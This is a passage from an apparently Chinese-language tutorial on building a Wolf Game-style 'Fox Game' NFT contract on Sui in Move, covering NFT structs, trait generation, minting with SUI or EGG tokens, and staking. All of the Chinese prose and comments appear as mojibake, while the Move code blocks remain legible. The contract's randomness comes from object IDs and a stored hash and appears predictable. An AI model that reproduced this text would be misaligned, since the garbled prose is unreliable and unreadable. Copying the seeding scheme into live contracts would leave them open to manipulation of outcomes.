ç¨ã€‚</p><p>ä¾‹å­ï¼šç‹¼Açš„ Alpha ä¸º8ï¼Œç‹¼Bçš„ Alpha ä¸º6ï¼Œå¹¶ä¸”ä»–ä»¬éƒ½è¢«è´¨æŠ¼ã€‚</p><ul><li>å¦‚æœç´¯è®¡ 70,000 ç¾Šæ¯›ä½œä¸ºç¨æ¬¾ï¼Œç‹¼Aå°†èƒ½å¤Ÿè·å¾— 40,000 ç¾Šæ¯›ï¼Œç‹¼Bå°†èƒ½å¤Ÿè·å¾— 30,000 ç¾Šæ¯›ï¼›</li><li>å¦‚æœæ–°é“¸é€ çš„ç¾Šæˆ–ç‹¼è¢«ç›—ï¼Œç‹¼Aæœ‰57%æ¦‚ç‡è·å¾—ï¼Œç‹¼Bæœ‰43%çš„æ¦‚ç‡è·å¾—ã€‚</li></ul><p>æœ¬æ¬¡é¡¹ç›®å®è·µï¼Œæˆ‘ä»¬å°†åœ¨ Sui åŒºå—é“¾ä¸Šé€šè¿‡ Move æ™ºèƒ½åˆçº¦è¯­è¨€æ¥å®ç°æ¸¸æˆé“¸é€ ï¼Œè´¨æŠ¼å’Œè·å– NFT è¿‡ç¨‹ï¼Œå¹¶ä½¿ç”¨æ–°çš„æ¸¸æˆå…ƒç´ ï¼šç‹ç‹¸ï¼Œé¸¡å’Œé¸¡è›‹ï¼Œå…¶ä¸­ç‹ç‹¸å¯¹åº”ç‹¼ï¼Œé¸¡å¯¹åº”ç¾Šï¼Œé¸¡è›‹å¯¹åº”ç¾Šæ¯›ï¼Œå…¶ä»–è¿‡ç¨‹ä¸å˜ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæ¸¸æˆå‘½åä¸º<strong>ç‹ç‹¸æ¸¸æˆ</strong>ã€‚</p><h2><span id="0x2-he-yue-kai-fa">0x2 åˆçº¦å¼€å‘</span></h2><p>æˆ‘ä»¬é¦–å…ˆè¿›è¡Œæ™ºèƒ½åˆçº¦çš„ç¼–å†™ï¼Œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>åˆ›å»º NFT</li><li>é“¸é€  NFTï¼ˆMintï¼‰</li><li>è´¨æŠ¼ NFT ï¼ˆStakeï¼‰</li><li>é¸¡è›‹ï¼ˆEGGï¼‰ä»£å¸å’Œæ”¶é›†é¸¡è›‹ï¼ˆCollect/Claimï¼‰</li><li>æå– NFTï¼ˆUnstakeï¼‰</li></ul><h3><span id="2-1-nft-jie-gou">2.1 NFT ç»“æ„</span></h3><p>é¦–å…ˆæˆ‘ä»¬å®šä¹‰ç‹ç‹¸å’Œé¸¡çš„ NFT çš„ç»“æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç»“æ„ä½“ <code>FoxOrChicken</code> æ¥è¡¨ç¤ºè¿™ä¸ª NFTï¼Œ é€šè¿‡ <code>is_chicken</code> æ¥è¿›è¡ŒåŒºåˆ†ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼štoken_helper.move</span></span><br><span class="line">   <span class="comment">/// Defines a Fox or Chicken attribute. Eg: `pattern: &#x27;panda&#x27;`</span></span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">Attribute</span> has store, copy, drop &#123;</span><br><span class="line">       name: vector&lt;<span class="type">u8</span>&gt;,</span><br><span class="line">       value: vector&lt;<span class="type">u8</span>&gt;,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">FoxOrChicken</span> has key, store &#123;</span><br><span class="line">       id: UID,</span><br><span class="line">       index: <span class="type">u64</span>, <span class="comment">// ç´¢å¼•</span></span><br><span class="line">       is_chicken: <span class="type">bool</span>, <span class="comment">// æ˜¯å¦æ˜¯é¸¡</span></span><br><span class="line">       alpha: <span class="type">u8</span>, <span class="comment">// ç‹ç‹¸çš„ alpha</span></span><br><span class="line">       url: Url, <span class="comment">// å›¾ç‰‡</span></span><br><span class="line">       link: Url, <span class="comment">// NFT é“¾æ¥</span></span><br><span class="line">       item_count: <span class="type">u8</span>, <span class="comment">// å½“å‰ NFT çš„æ•°é‡</span></span><br><span class="line">       attributes: vector&lt;Attribute&gt;, <span class="comment">// å±æ€§</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>url</code> æ—¢å¯ä»¥æ˜¯æŒ‡å‘ NFT å›¾ç‰‡çš„é“¾æ¥ï¼Œä¹Ÿå¯ä»¥æ˜¯ base64 ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ <code>data:image/svg+xml;base64,PHN2Zy......</code>ã€‚<code>link</code> æ˜¯ä¸€ä¸ªæŒ‡å‘ NFT çš„é¡µé¢ã€‚</p><h3><span id="2-2-chuang-jian-nft-dui-xiang">2.2 åˆ›å»º NFT å¯¹è±¡</span></h3><p>æ•´ä¸ªåˆ›å»º NFT çš„é€»è¾‘å¤§è‡´å°±æ˜¯æ ¹æ®éšæœºç§å­ç”Ÿæˆå¯¹åº”å±æ€§ç´¢å¼•ï¼Œæ ¹æ®å±æ€§ç´¢å¼•æ„å»ºå¯¹åº”çš„å±æ€§åˆ—è¡¨å’Œå›¾ç‰‡ï¼Œä»è€Œåˆ›å»º NFTã€‚</p><p>åˆ›å»º NFT ä½¿ç”¨åˆ° <code>FoCRegistry</code> ç»“æ„ä½“ï¼Œè¿™ä¸ªæ•°æ®ç»“æ„ç”¨äºè®°å½•å…³äº NFT çš„ä¸€äº›æ•°æ®ï¼Œæ¯”å¦‚ <code>foc_born</code> è®°å½•ç”Ÿäº§çš„ NFT æ€»æ•°ï¼Œ<code>foc_hash</code> ç”¨äºåœ¨ç”Ÿäº§ NFT æ—¶äº§ç”Ÿéšæœºæ•°ï¼Œè¯¥éšæœºæ•°ç”¨äºç”Ÿæˆ NFT çš„å±æ€§ï¼Œ<code>foc_hash</code> å¯ä»¥çœ‹ä½œæ˜¯ NFT çš„åŸºå› ã€‚å…·ä½“çš„å±æ€§å€¼è®°å½•å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼štoken_helper.move</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">FoCRegistry</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        foc_born: <span class="type">u64</span>, <span class="comment">// NFT supply</span></span><br><span class="line">        foc_hash: vector&lt;<span class="type">u8</span>&gt;, <span class="comment">// NFT gene</span></span><br><span class="line">        rarities: vector&lt;vector&lt;<span class="type">u8</span>&gt;&gt;, <span class="comment">// å±æ€§å€¼æ¦‚ç‡</span></span><br><span class="line">        aliases: vector&lt;vector&lt;<span class="type">u8</span>&gt;&gt;, <span class="comment">// å±æ€§å€¼ç´¢å¼•</span></span><br><span class="line">        types: Table&lt;ID, <span class="type">bool</span>&gt;, <span class="comment">// NFT å¯¹è±¡ ID ä¸ç±»å‹ï¼ˆæ˜¯å¦ä¸ºé¸¡ï¼‰çš„å¯¹åº”</span></span><br><span class="line">        alphas: Table&lt;ID, <span class="type">u8</span>&gt;, <span class="comment">// ç‹ç‹¸çš„ Alpha å€¼</span></span><br><span class="line">        trait_data: Table&lt;<span class="type">u8</span>, Table&lt;<span class="type">u8</span>, Trait&gt;&gt;, <span class="comment">// å±æ€§å€¼ï¼Œç¬¬ä¸€ä¸ªu8æ˜¯ç±»å‹ç¼–å·ï¼Œç¬¬äºŒä¸ªu8æ˜¯å±æ€§ç´¢å¼•</span></span><br><span class="line">        trait_types: vector&lt;vector&lt;<span class="type">u8</span>&gt;&gt;, <span class="comment">// å±æ€§ç±»å‹åç§°</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åˆ›å»º NFT æ–¹æ³• <code>create_foc</code> å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼štoken_helper.move</span></span><br><span class="line">        <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">create_foc</span>(</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> FoCRegistry, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ): FoxOrChicken &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">id</span> = object::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">        reg.foc_born = reg.foc_born + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// æ ¹æ® UID ä¸æ—§ foc_hash ç”Ÿäº§æ–°çš„ foc_hash</span></span><br><span class="line">        vec::<span class="title function_ invoke__">append</span>(&amp;<span class="keyword">mut</span> reg.foc_hash, object::<span class="title function_ invoke__">uid_to_bytes</span>(&amp;id));</span><br><span class="line">        reg.foc_hash = <span class="title function_ invoke__">hash</span>(reg.foc_hash);</span><br><span class="line">        <span class="comment">// éšæœºäº§ç”Ÿ traitï¼Œå¹¶ç”Ÿæˆå±æ€§å¯¹ attributes</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">fc</span> = <span class="title function_ invoke__">generate_traits</span>(reg);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">attributes</span> = <span class="title function_ invoke__">get_attributes</span>(reg, &amp;fc);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">alpha</span> = *vec::<span class="title function_ invoke__">borrow</span>(&amp;ALPHAS, (fc.alpha_index <span class="keyword">as</span> <span class="type">u64</span>));</span><br><span class="line">        <span class="comment">// è®°å½•IDå¯¹åº”ç±»å‹</span></span><br><span class="line">        table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> reg.types, object::<span class="title function_ invoke__">uid_to_inner</span>(&amp;id), fc.is_chicken);</span><br><span class="line">        <span class="keyword">if</span> (!fc.is_chicken) &#123;</span><br><span class="line">            table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> reg.alphas, object::<span class="title function_ invoke__">uid_to_inner</span>(&amp;id), alpha);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// ç”Ÿæˆäº‹ä»¶</span></span><br><span class="line">        <span class="title function_ invoke__">emit</span>(FoCBorn &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">uid_to_inner</span>(&amp;id),</span><br><span class="line">            index: reg.foc_born,</span><br><span class="line">            attributes: *&amp;attributes,</span><br><span class="line">            created_by: tx_context::<span class="title function_ invoke__">sender</span>(ctx),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// è¿”å›ç”Ÿæˆçš„ FoxOrChicken</span></span><br><span class="line">        FoxOrChicken &#123;</span><br><span class="line">            id,</span><br><span class="line">            index: reg.foc_born,</span><br><span class="line">            is_chicken: fc.is_chicken,</span><br><span class="line">            alpha: alpha,</span><br><span class="line">            url: <span class="title function_ invoke__">img_url</span>(reg, &amp;fc),</span><br><span class="line">            link: <span class="title function_ invoke__">link_url</span>(reg.foc_born, fc.is_chicken),</span><br><span class="line">            attributes,</span><br><span class="line">            item_count: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>genetate_traits</code> ç”¨äºæ ¹æ® <code>foc_hash</code> ç”Ÿæˆ NFT çš„å±æ€§å€¼ï¼Œæ­¤å¤„å±æ€§ä¸ºå¯¹åº”å±æ€§å€¼çš„ç´¢å¼•ï¼Œ<code>select_trait</code> æ ¹æ® A.J. Walkerâ€™s Alias ç®—æ³•æ ¹æ®é¢„å…ˆè®¾ç½®å¥½çš„æ¯ä¸€ä¸ªå±æ€§çš„éšæœºæ¦‚ç‡ï¼ˆ<code>rarities</code>ï¼‰æ¥å¿«é€Ÿç”Ÿæˆå¯¹åº”çš„å±æ€§ç´¢å¼•ã€‚è¯¦æƒ…å¯ä»¥å‚è€ƒæ–‡ç«  <a href="https://zhuanlan.zhihu.com/p/436785581">https://zhuanlan.zhihu.com/p/436785581</a> ä¸­ A.J. Walkerâ€™s Alias ç®—æ³•ä¸€èŠ‚****ã€‚****</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼š token_helper.move</span></span><br><span class="line">        <span class="comment">// generates traits for a specific token, checking to make sure it&#x27;s unique</span></span><br><span class="line">    public fun <span class="title function_ invoke__">generate_traits</span>(</span><br><span class="line">        reg: &amp;FoCRegistry,</span><br><span class="line">        <span class="comment">// seed: &amp;vector&lt;u8&gt;</span></span><br><span class="line">    ): Traits &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">seed</span> = reg.foc_hash;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">is_chicken</span> = *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">0</span>) &gt;= <span class="number">26</span>; <span class="comment">// 90% 0f 255</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">shift</span> = <span class="keyword">if</span> (is_chicken) <span class="number">0</span> <span class="keyword">else</span> <span class="number">9</span>;</span><br><span class="line">        <span class="comment">// æ ¹æ®éšæœºç§å­ç”Ÿæˆå±æ€§</span></span><br><span class="line">                Traits &#123;</span><br><span class="line">            is_chicken,</span><br><span class="line">            fur: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">1</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">10</span>), <span class="number">0</span> + shift),</span><br><span class="line">            head: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">2</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">11</span>), <span class="number">1</span> + shift),</span><br><span class="line">            ears: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">3</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">12</span>), <span class="number">2</span> + shift),</span><br><span class="line">            eyes: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">4</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">13</span>), <span class="number">3</span> + shift),</span><br><span class="line">            nose: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">5</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">14</span>), <span class="number">4</span> + shift),</span><br><span class="line">            mouth: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">6</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">15</span>), <span class="number">5</span> + shift),</span><br><span class="line">            neck: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">7</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">16</span>), <span class="number">6</span> + shift),</span><br><span class="line">            feet: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">8</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">17</span>), <span class="number">7</span> + shift),</span><br><span class="line">            alpha_index: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">9</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">18</span>), <span class="number">8</span> + shift),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ ¹æ® A.J. Walker&#x27;s Alias ç®—æ³•è®¡ç®—å±æ€§å€¼</span></span><br><span class="line">        fun <span class="title function_ invoke__">select_trait</span>(reg: &amp;FoCRegistry, seed1: <span class="type">u8</span>, seed2: <span class="type">u8</span>, trait_type: <span class="type">u64</span>): <span class="type">u8</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">trait</span> = (seed1 <span class="keyword">as</span> <span class="type">u64</span>) % vec::<span class="title function_ invoke__">length</span>(vec::<span class="title function_ invoke__">borrow</span>(&amp;reg.rarities, trait_type));</span><br><span class="line">        <span class="keyword">if</span> (seed2 &lt; *vec::<span class="title function_ invoke__">borrow</span>(vec::<span class="title function_ invoke__">borrow</span>(&amp;reg.rarities, trait_type), <span class="keyword">trait</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">return</span> (<span class="keyword">trait</span> <span class="title class_">as</span> <span class="type">u8</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        *vec::<span class="title function_ invoke__">borrow</span>(vec::<span class="title function_ invoke__">borrow</span>(&amp;reg.aliases, trait_type), <span class="keyword">trait</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œ <code>get_attributes</code> åˆ™æ˜¯æ ¹æ®å±æ€§ç´¢å¼•å€¼å¯¹åº”ä» <code>trait_types</code> å’Œ <code>trait_data</code> ä¸­å°†å±æ€§çš„çœŸå®å€¼å–å‡ºå¹¶æ„å»ºæˆå±æ€§æ•°ç»„ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_ invoke__">get_attributes</span>(reg: &amp;<span class="keyword">mut</span> FoCRegistry, fc: &amp;Traits): vector&lt;Attribute&gt;</span><br></pre></td></tr></table></figure><p>è€Œ <code>img_url</code> åˆ™é€šè¿‡ä¸Šè¿°ç”Ÿæˆçš„ç‰¹å¾æ„å»ºå‡ºå¯¹åº”çš„ base64 ç¼–ç çš„ svg å›¾ç‰‡ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/// Construct an image URL for the NFT.</span></span><br><span class="line">fun <span class="title function_ invoke__">img_url</span>(reg:&amp;<span class="keyword">mut</span> FoCRegistry, fc: &amp;Traits): Url &#123;</span><br><span class="line">    url::<span class="title function_ invoke__">new_unsafe_from_bytes</span>(<span class="title function_ invoke__">token_uri</span>(reg, fc))</span><br><span class="line">&#125;</span><br><span class="line">    fun <span class="title function_ invoke__">token_uri</span>(reg: &amp;<span class="keyword">mut</span> FoCRegistry, foc: &amp;Traits): vector&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">uri</span> = <span class="string">b&quot;data:image/svg+xml;base64,&quot;</span>;</span><br><span class="line">    vec::<span class="title function_ invoke__">append</span>(&amp;<span class="keyword">mut</span> uri, base64::<span class="title function_ invoke__">encode</span>(&amp;<span class="title function_ invoke__">draw_svg</span>(reg, foc)));</span><br><span class="line">    uri</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>create_foc</code> æ–¹æ³•åˆ›å»ºä¸€ä¸ª FoxOrChicken NFTã€‚</p><h3><span id="2-3-zhu-zao-nft">2.3 é“¸é€  NFT</span></h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹åˆ°é“¸é€  NFT è¿‡ç¨‹ï¼Œå¤§è‡´è¿‡ç¨‹ä¸ºï¼š</p><ol><li>åˆ¤æ–­æ€»ä¾›ç»™é‡æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼›</li><li>å¦‚æœåœ¨ SUI ä»£å¸è´­ä¹°é˜¶æ®µï¼Œåˆ™è½¬ç§» SUI ä»£å¸ï¼Œå¦åˆ™ï¼Œéœ€è¦æ”¯ä»˜ EGG ä»£å¸è¿›è¡Œé“¸é€ ï¼ŒEGG çš„é“¸é€ å’Œé”€æ¯åœ¨ä¹‹åçš„ç« èŠ‚ä¸­ä»‹ç»ï¼›</li><li>é“¸é€  NFT å¹¶æ ¹æ®50%æ¦‚ç‡åˆ¤æ–­æ˜¯å¦è¢«è´¨æŠ¼çš„ç‹ç‹¸ç›—èµ°ï¼›</li><li>å¦‚æœé€‰æ‹©è´¨æŠ¼åˆ™å°† NFT è½¬å…¥è´¨æŠ¼ï¼Œå¦åˆ™è½¬å…¥é“¸é€ è€…çš„è´¦æˆ·ä¸­ã€‚</li></ol><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ–‡ä»¶ï¼š fox.move</span></span><br><span class="line">    <span class="comment">/// mint a fox or chicken</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mint</span>(</span><br><span class="line">        global: &amp;<span class="keyword">mut</span> Global,</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;,</span><br><span class="line">        amount: <span class="type">u64</span>,</span><br><span class="line">        stake: <span class="type">bool</span>,</span><br><span class="line">        pay_sui: vector&lt;Coin&lt;SUI&gt;&gt;,</span><br><span class="line">        pay_egg: vector&lt;Coin&lt;EGG&gt;&gt;,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert_enabled</span>(global);</span><br><span class="line">        <span class="comment">// æ£€æŸ¥ä¾›åº”é‡æ˜¯å¦è¶…å‡ºæ€»ä¾›åº”é‡</span></span><br><span class="line">        <span class="built_in">assert!</span>(amount &gt; <span class="number">0</span> &amp;&amp; amount &lt;= config::<span class="title function_ invoke__">max_single_mint</span>(), EINVALID_MINTING);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">token_supply</span> = token_helper::<span class="title function_ invoke__">total_supply</span>(&amp;global.foc_registry);</span><br><span class="line">        <span class="built_in">assert!</span>(token_supply + amount &lt;= config::<span class="title function_ invoke__">target_max_tokens</span>(), EALL_MINTED);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">receiver_addr</span> = <span class="title function_ invoke__">sender</span>(ctx);</span><br><span class="line">        <span class="comment">// å¤„ç† SUI ä»£å¸ä»˜æ¬¾</span></span><br><span class="line">        <span class="keyword">if</span> (token_supply &lt; config::<span class="title function_ invoke__">paid_tokens</span>()) &#123;</span><br><span class="line">            <span class="built_in">assert!</span>(vec::<span class="title function_ invoke__">length</span>(&amp;pay_sui) &gt; <span class="number">0</span>, EINSUFFICIENT_SUI_BALANCE);</span><br><span class="line">            <span class="built_in">assert!</span>(token_supply + amount &lt;= config::<span class="title function_ invoke__">paid_tokens</span>(), EALL_MINTED);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">price</span> = config::<span class="title function_ invoke__">mint_price</span>() * amount;</span><br><span class="line">            <span class="keyword">let</span> (paid, remainder) = <span class="title function_ invoke__">merge_and_split</span>(pay_sui, price, ctx);</span><br><span class="line">            coin::<span class="title function_ invoke__">put</span>(&amp;<span class="keyword">mut</span> global.balance, paid);</span><br><span class="line">            <span class="title function_ invoke__">transfer</span>(remainder, <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// EGG ä»£å¸ä»˜æ¬¾é˜¶æ®µè¿”è¿˜ SUI ä»£å¸</span></span><br><span class="line">            <span class="keyword">if</span> (vec::<span class="title function_ invoke__">length</span>(&amp;pay_sui) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">transfer</span>(<span class="title function_ invoke__">merge</span>(pay_sui, ctx), <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                vec::<span class="title function_ invoke__">destroy_empty</span>(pay_sui);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">id</span> = object::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">seed</span> = <span class="title function_ invoke__">hash</span>(object::<span class="title function_ invoke__">uid_to_bytes</span>(&amp;id));</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">total_egg_cost</span>: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">tokens</span>: vector&lt;FoxOrChicken&gt; = vec::empty&lt;FoxOrChicken&gt;();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; amount) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token_index</span> = token_supply + i + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦è¢«ç‹ç‹¸ç›—èµ°</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">recipient</span>: address = <span class="title function_ invoke__">select_recipient</span>(&amp;<span class="keyword">mut</span> global.pack, receiver_addr, seed, token_index);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token</span> = token_helper::<span class="title function_ invoke__">create_foc</span>(&amp;<span class="keyword">mut</span> global.foc_registry, ctx);</span><br><span class="line">            <span class="keyword">if</span> (!stake || recipient != receiver_addr) &#123;</span><br><span class="line">                <span class="title function_ invoke__">transfer</span>(token, receiver_addr);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                vec::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> tokens, token);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// è®¡ç®— EGG ä»£å¸èŠ±è´¹</span></span><br><span class="line">            total_egg_cost = total_egg_cost + <span class="title function_ invoke__">mint_cost</span>(token_index);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// å¦‚æœéœ€è¦ EGG ä»£å¸èŠ±è´¹ï¼Œåˆ™è½¬ç§»å¹¶é”€æ¯ EGG ä»£å¸</span></span><br><span class="line">        <span class="keyword">if</span> (total_egg_cost &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">assert!</span>(vec::<span class="title function_ invoke__">length</span>(&amp;pay_egg) &gt; <span class="number">0</span>, EINSUFFICIENT_EGG_BALANCE);</span><br><span class="line">            <span class="comment">// burn EGG</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">total_egg</span> = <span class="title function_ invoke__">merge</span>(pay_egg, ctx);</span><br><span class="line">            <span class="built_in">assert!</span>(coin::<span class="title function_ invoke__">value</span>(&amp;total_egg) &gt;= total_egg_cost, EINSUFFICIENT_EGG_BALANCE);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">paid</span> = coin::<span class="title function_ invoke__">split</span>(&amp;<span class="keyword">mut</span> total_egg, total_egg_cost, ctx);</span><br><span class="line">            egg::<span class="title function_ invoke__">burn</span>(treasury_cap, paid);</span><br><span class="line">            <span class="title function_ invoke__">transfer</span>(total_egg, <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (vec::<span class="title function_ invoke__">length</span>(&amp;pay_egg) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">transfer</span>(<span class="title function_ invoke__">merge</span>(pay_egg, ctx), <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                vec::<span class="title function_ invoke__">destroy_empty</span>(pay_egg);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// é“¸é€ çš„åŒæ—¶è´¨æŠ¼ï¼Œåˆ™å°† NFT è½¬å…¥é‡è¦ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (stake) &#123;</span><br><span class="line">            barn::<span class="title function_ invoke__">stake_many_to_barn_and_pack</span>(</span><br><span class="line">                &amp;<span class="keyword">mut</span> global.barn_registry,</span><br><span class="line">                &amp;<span class="keyword">mut</span> global.barn,</span><br><span class="line">                &amp;<span class="keyword">mut</span> global.pack,</span><br><span class="line">                tokens,</span><br><span class="line">                ctx</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            vec::<span class="title function_ invoke__">destroy_empty</span>(tokens);</span><br><span class="line">        &#125;;</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="2-4-zhi-ya-nft">2.4 è´¨æŠ¼ NFT</span></h3><p>è´¨æŠ¼ NFT æ—¶ï¼Œæˆ‘ä»¬é€šè¿‡ NFT çš„å±æ€§å€¼ <code>is_chicken</code> æ¥å°†ä¸åŒçš„NFTæ”¾ç½®åˆ°ä¸åŒçš„å®¹å™¨ä¸­ã€‚å…¶ä¸­ï¼Œç‹ç‹¸æ”¾ç½®åœ¨ Pack ä¸­ï¼Œé¸¡æ”¾ç½®åœ¨ Barn ä¸­ã€‚æ¯ä¸€ä¸ª NFT åœ¨æ”¾ç½®çš„åŒæ—¶è®°å½•å¯¹åº”çš„ owner åœ°å€å’Œç”¨äºè®¡ç®—è´¨æŠ¼æ”¶ç›Šçš„æ—¶é—´æˆ³ã€‚</p><p>å¯¹äº <code>Barn</code>ï¼Œé™¤äº†è®°å½• NFT å¯¹è±¡ <code>ID</code> ä¸ <code>Stake</code> ä¹‹é—´å¯¹åº”å…³ç³»çš„ <code>items</code>ï¼Œè¿˜å¢åŠ äº†ä¸€ä¸ª <code>dynamic_field</code>ï¼Œç”¨äºè®°å½• owner åœ°å€æ‰€æœ‰è´¨æŠ¼çš„ NFT çš„æ•°ç»„ï¼š <code>dynamic_field: &lt;address, 